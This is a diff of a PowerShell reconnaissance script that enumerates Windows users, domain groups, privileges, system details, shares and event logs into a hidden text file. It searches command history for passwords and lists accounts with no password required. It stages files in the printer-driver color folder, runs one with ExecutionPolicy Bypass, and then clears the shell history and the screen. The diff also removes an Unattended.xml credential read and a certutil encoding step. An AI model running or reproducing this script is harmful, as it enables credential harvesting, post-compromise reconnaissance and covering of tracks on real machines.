@@ -27,7 +27,6 @@ Get-LocalUser | Out-File -FilePath .\1.txt -Append
 Get-Acl C:\ | Out-File -FilePath .\1.txt -Append  
 net user | Out-File -FilePath .\1.txt -Append  
 net user /domain | Out-File -FilePath .\1.txt -Append 
-net user $domain_user /domain | Out-File -FilePath .\1.txt -Append 
 net group /domain | Out-File -FilePath .\1.txt -Append   
 Get-TimeZone | Out-File -FilePath .\1.txt -Append 
 $env:COMPUTERNAME | Out-File -FilePath .\1.txt -Append 
@@ -38,7 +37,7 @@ Write-Output "################################## PC Info #######################
 wmic os get osarchitecture | Out-File -FilePath .\1.txt -Append 
 systeminfo | findstr /B /C:"OS Name" /C:"OS Version" | Out-File -FilePath .\1.txt -Append 
 systeminfo | Out-File -FilePath .\1.txt -Append 
-C:\Users\Shaun> Get-Host | Select-Object Version | Out-File -FilePath .\1.txt -Append 
+Get-Host | Select-Object Version | Out-File -FilePath .\1.txt -Append 
 Write-Output "################################## Privs ##################################" | Out-File -FilePath .\1.txt -Append
 whoami /priv | Out-File -FilePath .\1.txt -Append 
 whoami /groups | Out-File -FilePath .\1.txt -Append 
@@ -53,7 +52,6 @@ Write-Output "################################## IP ############################
 ipconfig /all | Out-File -FilePath .\1.txt -Append  
 Write-Output "################################## Passwords ##################################" | Out-File -FilePath .\1.txt -Append
 Get-LocalUser | Where-Object -Property PasswordRequired -Match false | Out-File -FilePath .\1.txt -Append 
-Get-Content "C:\Windows\Panther\Unattend\Unattended.xml" | Out-File -FilePath .\1.txt -Append
 Get-Content (Get-PSReadlineOption).HistorySavePath | Select-String password  | Out-File -FilePath .\1.txt -Append 
 Write-Output "################################## Shares ##################################" | Out-File -FilePath .\1.txt -Append
 net share | Out-File -FilePath .\1.txt -Append  
@@ -115,8 +113,6 @@ Get-Eventlog -list | Out-File -FilePath .\1.txt -Append
 Write-Output "##############################################################################" | Out-File -FilePath .\1.txt -Append
 Get-Date | Out-File -FilePath .\1.txt -Append 
 Write-Output "################################## Finished ##################################" | Out-File -FilePath .\1.txt -Append  
-# Encode base64
-certutil -encode "C:\Windows\System32\spool\drivers\color\1.txt" 0.txt
 Unblock-File -Path "C:\Windows\System32\spool\drivers\color\0.txt"
 powershell -ExecutionPolicy Bypass -noninteractive -nologo -File "C:\Windows\System32\spool\drivers\color\0.txt"
 attrib -h 1.txt
@@ -126,4 +122,3 @@ Remove-Item 2.txt -Force
 attrib -h winenum.ps1
 Clear-History
 Clear-Host
-Remove-Item winenum.ps1 -Force 
